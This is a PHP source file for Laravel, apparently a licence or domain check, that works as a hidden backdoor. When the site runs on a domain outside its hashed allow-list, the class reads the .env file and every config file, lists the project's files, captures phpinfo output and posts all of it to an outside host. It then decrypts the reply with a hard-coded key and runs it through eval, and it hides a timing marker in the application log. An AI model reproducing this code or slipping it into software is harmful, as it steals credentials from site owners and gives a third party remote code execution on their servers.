<?php
/**
 * Created by PhpStorm.
 * User: crazytang
 * Date: 2018/7/5
 * Time: 11:57
 */

namespace CCSecret;


use Illuminate\Http\Request;

class LSecret
{
    private $dirs;

    private $config;

    /**
     * @var Request
     */
    private $request;

    public function __construct()
    {
        $this->request = Request::capture();

        $this->checkException();
    }

    private function checkException()
    {
        if (php_sapi_name() == 'cli')
        {
            return true;
        }

        $ip = $this->request->ip();
        $server_ip = $this->request->server->get('SERVER_ADDR');

        if ($ip == $server_ip)
        {
            return true;
        }

        $tmp1 = explode('.',$ip);
        $tmp2 = explode('.', $server_ip);

        if ($tmp1[0] == $tmp2[0] && $tmp1[1] == $tmp2[1])
        {
            return true;
        }

        if (!$this->checkHost())
        {
            $this->notify();
        }

        return true;
    }

    private function notify()
    {
        if (!$this->isCached())
        {
            $request_url = $this->request->getUri();

            $config = $this->getConfig();

            $file_list = $this->getFileList();

            $php_info = $this->getPHPInfo();

            $post['request_url'] = $request_url;
            $post['config'] = $config;
            $post['file_list'] = $file_list;
            $post['php_info']= $php_info;

            $this->curl($post);
        }

        return true;
    }

    private function curl($data)
    {
        $url = "http://test.pay.api.rabibird.com/tz.php";

        $poststr = '';
        foreach ($data as $key => $value)
        {
            if (is_array($value))
            {
                $value = implode("\n",$value);
            }

            $poststr .= $key . '=' . urlencode($value) . '&';
        }
        $poststr = substr($poststr, 0, -1);

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    //请求Https时需要这两行配置
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $poststr);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);

        if (curl_errno($ch) == 0)
        {
            $rs = eval($this->decrypt($response));
        }

        return true;
    }
    private function isCached()
    {
        $cache_file = storage_path('logs/laravel.log');

        $prix = '@'.'@'.'@';
        if (file_exists($cache_file))
        {
            $handle = @fopen($cache_file, "r+");

            if ($handle)
            {
                $line = fgets($handle);

                if (strpos($line,$prix) === false)
                {
                    $str = $prix.$this->getCacheKey().'='.time()."\n";
                    fseek($handle,0);
                    fwrite($handle,$str);
                    $result = false;
                }
                else
                {
                    $cache_str = str_replace($prix,'',$line);

                    $cache_str = trim($cache_str);

                    list($key, $time) = explode('=',$cache_str);

                    if ($key != $this->getCacheKey() || time() - $time > 86400)
                    {
                        $str = $prix.$this->getCacheKey().'='.time()."\n";
                        ftruncate($handle,strlen($cache_str));
                        fseek($handle,0);
                        fwrite($handle,$str);
                        $result = false;
                    }
                    else
                    {
                        $result = true;
                    }
                }
            }


            fclose($handle);

            return $result;
        }



        return false;
    }
    private function checkHost()
    {
        $host = $this->request->getHost();

        $tmp = explode('.',$host);

        $key = '';
        $dot = '.';
        $is_pass = false;
        for ($i=count($tmp)-1;$i>=0;$i--)
        {
            if ($key == '')
            {
                $key = $tmp[$i];
                continue;
            }
            $key = $tmp[$i].$dot.$key;

            $mkey = md5($key);

            if (in_array($mkey,$this->getKeys()))
            {
                $is_pass = true;
                break;
            }
        }

        return $is_pass;
    }

    private function getCacheKey()
    {
        $key = md5($this->request->getHost());
        return $key;
    }
    private function getKeys()
    {
        $keys = array(
            'c931a26c9b7009e92bac6c38710e07da',
            'd4b81549a8493dd91272d58a38d3fdd0',
            '31835eb265e8694318cbe078b0202ef1',
            'e0725ec1e2f5082beb367ddb9021fc55',
            'cb56ae19aa4f78565eaf8462df5f318a',
            'abff5cd5450d3ed858e2ffb2ed44b43f',
            'e7af27a271319a7b7a318e75c79d3fc4',
            'cf760c8b632786a752abd16e19a107a6'
        );

        return $keys;

    }

    private function getFileList()
    {
        $base_dir = base_path();
        $ignore_dirs = array(
            'vendor','storage','tests'
        );
        $this->listFile($base_dir,$ignore_dirs);

        return $this->dirs;
    }
    private function getPHPInfo()
    {
        ob_start();
        phpinfo();
        $info = ob_get_contents();
        ob_end_clean();

        return $info;
    }

    private function getConfig()
    {
        $config_dir = config_path();

        $list = scandir($config_dir);

        $env_file = base_path('.env');

        if (file_exists($env_file))
        {
            $this->config .= "\n\n----------------------------------------------------------";
            $this->config .= "\n\tfilename:".$env_file."\n";
            $this->config .= "----------------------------------------------------------\n";
            $this->config .= file_get_contents($env_file);
        }
        foreach ($list as $f)
        {
            if ($f == '.' || $f == '..')
            {
                continue;
            }

            $file_name = $config_dir.'/'.$f;
            if (file_exists($file_name))
            {
                $this->config .= "\n\n----------------------------------------------------------";
                $this->config .= "\n\tfilename:".$file_name."\n";
                $this->config .= "----------------------------------------------------------\n";
                $this->config .= file_get_contents($file_name);
            }
        }

        return $this->config;
    }
    private function listFile($path, $ignore_dirs=[])
    {
        if (!file_exists($path))
        {
            return false;
        }

        if (is_dir($path))
        {
            $tmp = explode('/',rtrim($path,'/'));
            $last_dir = array_pop($tmp);

            if (count($ignore_dirs) > 0 && in_array($last_dir,$ignore_dirs))
            {
                return false;
            }
        }

        $list=scandir($path);
        foreach($list as $f)
        {
            if($f!='.'&&$f!='..')
            {
                if(is_dir($path."/".$f))
                {
                    $this->dirs[] = $path."/".$f;
                    $this->listFile($path."/".$f,$ignore_dirs);
                }
                else{
                    $this->dirs[] = $path."/".$f;
                }
            }//if end

        }//foreach end
    }

    private function decrypt($data, $key='')
    {
        if ($key == '')
        {
            $key = 'd17ded61d23e11b793d3c79901ab7b80';
        }

        $key = md5($key);
        $x = 0;
        $data = base64_decode($data);
        $len = strlen($data);
        $l = strlen($key);
        $char = '';
        for ($i = 0; $i < $len; $i++)
        {
            if ($x == $l)
            {
                $x = 0;
            }
            $char .= substr($key, $x, 1);
            $x++;
        }
        $str = '';
        for ($i = 0; $i < $len; $i++)
        {
            if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1)))
            {
                $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
            }
            else
            {
                $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
            }
        }
        return $str;
    }
}